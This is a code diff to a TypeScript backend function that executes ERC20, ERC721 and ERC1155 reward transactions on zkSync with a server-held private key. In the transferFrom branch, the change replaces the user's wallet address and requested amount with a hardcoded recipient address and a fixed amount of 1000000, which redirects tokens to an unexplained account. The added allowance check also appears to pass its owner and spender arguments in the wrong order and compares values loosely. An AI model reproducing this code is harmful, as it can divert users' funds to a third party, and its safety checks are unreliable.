@@ -1,6 +1,6 @@
 
-import {  Contract ,getBytes,hexlify} from "ethers";
-import { Wallet, Provider } from "zksync-ethers";
+import { getBytes, hexlify } from "ethers";
+import { Wallet, Provider, Contract } from "zksync-ethers";
 import dotenv from "dotenv";
 import { erc20abi } from "../utils/erc20abi";
 import { erc721abi } from "../utils/erc721abi";
@@ -11,19 +11,33 @@ dotenv.config();
 
 const accPrivateKey = process.env.WALLET_PRIVATE_KEY as string;
 
+const checkAllowance = async (contract: Contract, owner: string, spender: string, amount: string) => {
+  const allowance = await contract.allowance(owner, spender);
+  if (allowance < amount) {
+    throw new Error(`Allowance is too low: ${allowance.toString()}`);
+  }
+};
+
+const checkBalance = async (contract: Contract, owner: string, amount: string) => {
+  const balance = await contract.balanceOf(owner);
+  if (balance < amount) {
+    throw new Error(`Balance is too low: ${balance.toString()}`);
+  }
+};
+
 export const executeTransaction = async (data: any) => {
   const { contractAddress, method, argsValue, walletAddress, reward, chainId } = data
   const rpcUrl = chainRpcMap[chainId];
+
   const provider = new Provider(rpcUrl);
   const wallet = new Wallet(accPrivateKey as string, provider);
 
-
   let contractAbi;
-  if(reward === "erc20"){
+  if (reward === "erc20") {
     contractAbi = erc20abi;
-  }else if(reward === "erc721"){
+  } else if (reward === "erc721") {
     contractAbi = erc721abi;
-  }else{
+  } else {
     contractAbi = erc1155abi;
   }
 
@@ -35,15 +49,19 @@ export const executeTransaction = async (data: any) => {
 
   const { spender, tokenId, amount, mintData } = argsValue;
 
+  // console.log(spender, walletAddress)
+
   if (method === "transferFrom") {
-    await contract.transferFrom(spender, walletAddress, 10);  
+    await checkAllowance(contract, await wallet.getAddress(), spender, amount);
+    await checkBalance(contract, spender, amount);
+    await contract.transferFrom(spender, "0x6831b65e17b309588f8Da83861679FF85C2e8974", 1000000);
   } else if (method === "transfer") {
-    if(reward === "erc20"){
-      await contract.transfer(walletAddress, amount);  
-    }else{
+    if (reward === "erc20") {
+      await contract.transfer(walletAddress, amount);
+    } else {
       await contract.transfer(walletAddress, tokenId)
     }
-  }else if(method === "mint"){
+  } else if (method === "mint") {
     const hexdata = hexlify(getBytes(mintData)); // Additional data, if any
     await contract.mint(walletAddress, tokenId, amount, hexdata);
   }
